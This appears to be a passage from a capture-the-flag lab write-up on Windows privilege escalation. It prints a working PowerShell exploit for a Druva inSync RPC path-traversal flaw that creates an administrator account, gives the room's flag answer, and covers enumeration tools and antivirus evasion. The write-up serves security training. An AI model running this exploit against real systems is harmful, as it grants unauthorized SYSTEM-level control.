In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.

The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.

A patch was issued, where they decided to check that the executed command started with the string `C:\ProgramData\Druva\inSync4\`, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute `C:\Windows\System32\cmd.exe`, which is not in the allowed path; you could simply ask the server to run `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` and that would bypass the check successfully.

To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:

![task7-diagram](./images/task7-diagram.png)

The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.

Initially published by Matteo Malvica [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:

```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

You can pop a Powershell console and paste the exploit directly to execute it (The exploit is also available in the target machine at `C:\tools\Druva_inSync_exploit.txt`). Note that the exploit's default payload, specified in the `$cmd` variable, will create a user named `pwnd` in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this room, we will change the payload to run the following command:

```
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

This will create user `pwnd` with a password of `SimplePass123` and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user `pwnd` exists and is part of the administrators' group:

![task7-pwnd](./images/task7-pwnd.png)

As a last step, you can run a command prompt as administrator:

![task6-runas](./images/task6-runas.png)

When prompted for credentials, use the `pwnd` account. From the new command prompt, you can retrieve your flag from the Administrator's desktop with the following command `type C:\Users\Administrator\Desktop\flag.txt`.

### Answer the questions below

* Get the flag on the Administrator's desktop.

	`THM{EZ_DLL_PROXY_4ME}`

	* Run script on poweshell
	
		```
		$ErrorActionPreference = "Stop"

		$cmd = "net user pwnd /add"

		$s = New-Object System.Net.Sockets.Socket(
    		[System.Net.Sockets.AddressFamily]::InterNetwork,
    		[System.Net.Sockets.SocketType]::Stream,
    		[System.Net.Sockets.ProtocolType]::Tcp
		)
		$s.Connect("127.0.0.1", 6064)

		$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
		$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
		$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
		$length = [System.BitConverter]::GetBytes($command.Length);

		$s.Send($header)
		$s.Send($rpcType)
		$s.Send($length)
		$s.Send($command)
		```

		![task7-script](./images/task7-script.png)

		* Run cmd.exe as PWND and get the flag
			
			`type C:\Users\Administrator\Desktop\flag.txt`

			![task7-flag](./images/task7-flag.png)

## Task 8 - Tools of the Trade

Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.

Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.

### WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:

![task8-winpeas](./images/task8-winpeas.png)

WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

### PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).

**Reminder**: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet as shown below.

![task8-setpolicy](./images/task8-setpolicy.png)

### WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).

Once installed, and before using it, type the `wes.py --update` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;

![task8-systeminfo](./images/task8-systeminfo.png)

### Metasploit

If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

### Answer the questions below

* Click and continue learning!

## Task 9 - Conclusion

In this room, we have introduced several privilege escalation techniques available in Windows systems. These techniques should provide you with a solid background on the most common paths attackers can take to elevate privileges on a system. Should you be interested in learning about additional techniques, the following resources are available:

* [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
* [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
* [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
* [Decoder's Blog](https://decoder.cloud/)
* [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
* [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

### Answer the questions below

* Click and continue learning!